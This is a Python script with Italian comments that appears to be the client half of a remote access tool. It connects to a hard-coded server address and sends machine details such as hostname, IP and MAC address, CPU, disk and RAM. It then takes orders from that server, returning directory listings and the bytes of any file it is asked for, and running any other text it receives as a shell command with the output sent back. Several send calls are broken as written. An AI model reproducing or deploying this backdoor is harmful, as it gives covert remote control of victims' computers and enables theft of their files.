import getpass
import re
import uuid
from socket import *
import platform
import os
import psutil
import subprocess


def get_size(bytes, suffix="B"):
    """
    Scale bytes to its proper format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'
    """
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


checkConnectionPort = 23000
# indirizzo IP a cui connettersi
serverName = '192.168.43.141'
# usata solo per pairing iniziale, il S.O. assegna poi una porta
serverPort = 6677
clientSocket = socket(AF_INET, SOCK_STREAM)
while True:
    try:
        clientSocket.connect((serverName, serverPort))
    except:
        print('Ops... connessione non trovata, attendere...\n')
        continue

    break

clientSocket.send(platform.node().encode())
clientSocket.send(platform.release().encode)
clientSocket.send(gethostbyname(gethostname()).encode())
clientSocket.send(':'.join(re.findall('..', '%012x' % uuid.getnode())))
clientSocket.send(platform.version().encode())
clientSocket.send(platform.processor().encode)
clientSocket.send(psutil.cpu_count(logical=False).encode)
clientSocket.send(psutil.cpu_count(logical=True).encode)
partitions = psutil.disk_partitions()
diskinfo = ''
for partition in partitions:
    diskinfo += " Device: " + partition.device + "\n"
    diskinfo += " Mountpoint: " + partition.mountpoint + "\n"
    diskinfo += " File system type: " + partition.fstype + "\n"
    try:
        partition_usage = psutil.disk_usage(partition.mountpoint)
    except PermissionError:
        # this can be catched due to the disk that
        # isn't ready
        continue
    diskinfo += " Total Size: " + get_size(partition_usage.total) + "\n"
    diskinfo += " Used: " + get_size(partition_usage.used) + "\n"
    diskinfo += " Free: " + get_size(partition_usage.free) + "\n"
    diskinfo += " Percentage: " + str(partition_usage.percent) + "%\n"
clientSocket.send(diskinfo.encode)

ram = 'RAM: ' + str(int(psutil.virtual_memory().total / 1024.0 ** 3)) + 'GB'
clientSocket.send(ram)

"""
#VECCHIO CODICE
node = platform.node()
release = platform.release()
ipaddr = gethostbyname(gethostname())
macaddr = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
version = platform.version()
processor = platform.processor()
cores = psutil.cpu_count(logical=False)
threads = psutil.cpu_count(logical=True)
partitions = psutil.disk_partitions()
diskinfo = ''
for partition in partitions:
    diskinfo += " Device: " + partition.device + "\n"
    diskinfo += " Mountpoint: " + partition.mountpoint + "\n"
    diskinfo += " File system type: " + partition.fstype + "\n"
    try:
        partition_usage = psutil.disk_usage(partition.mountpoint)
    except PermissionError:
        # this can be catched due to the disk that
        # isn't ready
        continue
    diskinfo += " Total Size: " + get_size(partition_usage.total) + "\n"
    diskinfo += " Used: " + get_size(partition_usage.used) + "\n"
    diskinfo += " Free: " + get_size(partition_usage.free) + "\n"
    diskinfo += " Percentage: " + str(partition_usage.percent) + "%\n"
info = 'System: ' + platform.system()
info += '\nOS Version: ' + version
info += '\nRelease: ' + release
info += '\nMachine name: ' + node
info += '\nProcessor: ' + processor
info += '\nCores: ' + str(cores)
info += '\nThreads: ' + str(threads)
info += '\nUser: ' + getpass.getuser()
info += '\nIP Address: ' + ipaddr
info += '\nMAC Address: ' + macaddr
info += '\nRAM: ' + str(int(psutil.virtual_memory().total / 1024.0 ** 3)) + 'GB'
info += '\nDisk info: ' + diskinfo


clientSocket.send(info.encode())
"""
ack = clientSocket.recv(1024).decode()
command = clientSocket.recv(2048).decode()
while command != 'exit':
    print(command)
    if command == 'ls':
        path = os.getcwd()
        clientSocket.send(path.encode())
        clientSocket.send(str(os.listdir(path)).encode())
    elif command.startswith('1'):
        try:
            if command[1:] != '..':
                os.chdir(command[1:])
            else:
                os.chdir(os.path.normpath(os.getcwd() + os.sep + os.pardir))
            path = os.getcwd()
            clientSocket.send(path.encode())
        except OSError:
            path = "Directory inesistente."
            clientSocket.send(path.encode())
    elif command.startswith('0'):
        try:
            file = open(command[1:], "rb")
            data = file.read()
            clientSocket.send('1'.encode())
            clientSocket.send(data)
            file.close()
        except Exception as e:
            print(e)
            clientSocket.send('0'.encode())
    else:
        if platform.system() == 'Windows':
            # necessario per windows per far eseguire i comandi
            cmd = "cd C:\\Windows\\System32 && "
            proc = subprocess.Popen(cmd + command, stdout=subprocess.PIPE, shell=True)
            out, err = proc.communicate()
            if out == b'':
                notFound = "Command not found"
                clientSocket.send(notFound.encode())
                proc.kill()
            else:
                clientSocket.send(out)
                proc.kill()
        else:
            proc = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
            out, err = proc.communicate()
            if out == b'':
                notFound = "Command not found"
                clientSocket.send(notFound.encode())
                proc.kill()
            else:
                clientSocket.send(out)
                proc.kill()
    command = clientSocket.recv(2048).decode()

print("Connessione terminata")
clientSocket.close()
